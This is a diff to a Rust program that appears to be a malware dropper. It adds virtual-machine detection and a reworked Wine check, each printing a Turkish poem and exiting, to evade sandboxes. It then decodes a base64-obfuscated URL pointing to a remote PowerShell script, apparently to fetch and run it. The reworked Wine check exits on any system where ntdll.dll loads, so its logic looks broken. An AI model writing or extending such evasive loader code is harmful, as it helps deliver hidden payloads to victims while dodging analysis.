@@ -3,15 +3,23 @@ use libloading::Library;
 use rand::{distributions::Alphanumeric, Rng};
 use reqwest;
 use std::process::{Command, Output};
-fn is_running_under_wine() -> bool {
+use vm_detect::{vm_detect, Detection};
+
+fn is_running_under_wine() {
     unsafe {
+        #[allow(unused_variables)]
         if let Ok(lib) = Library::new("ntdll.dll") {
-            let func: libloading::Symbol<unsafe extern "C" fn() -> *const i8> =
-                lib.get(b"wine_get_version").unwrap();
-            return !func().is_null();
+            println!(
+                "
+    ırmaklarından şaraplar akacak diyorsun
+    cennet-i alâ meyhane midir?
+    her mümin'e iki huri diyorsun
+    cennet-i alâ kerhane midir?
+                "
+            );
+            std::process::exit(0);
         }
     }
-    false
 }
 
 fn generate_key() -> String {
@@ -43,21 +51,29 @@ fn run_command(command: &String) -> Output {
     output
 }
 
-#[tokio::main]
-async fn main() {
-    if is_running_under_wine() {
+fn is_running_in_vm() {
+    let detection = vm_detect();
+    if detection.contains(Detection::HYPERVISOR_BIT) {
         println!(
             "
-ırmaklarından şaraplar akacak diyorsun
-cennet-i alâ meyhane midir?
-her mümin'e iki huri diyorsun
-cennet-i alâ kerhane midir? 
+        Sanal dünya, kodların dans ettiği yer,
+        Programlar koşar, sınırlar kalkar gider.
+        RAM'de hayat bulur, işlemci hızla döner,
+        Sanal makine, hayallerin gerçek olduğu yer.
             "
         );
-        std::process::exit(0);
+        std::process::exit(0)
     }
+}
+
+#[tokio::main]
+async fn main() {
+    is_running_under_wine();
+    is_running_in_vm();
     let b64_string =
         "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0VsMG1hci9sZWdlbmRhcnktdHJhaW4vcmVmcy9oZWFkcy9tYWluL3NjcmlwdC5wczEK";
+
+    #[allow(deprecated)]
     let decoded_bytes = base64::decode(b64_string).expect("Something went wrong.");
     let decoded_string = String::from_utf8(decoded_bytes).expect("Something went wrong.");
     let url = decoded_string;
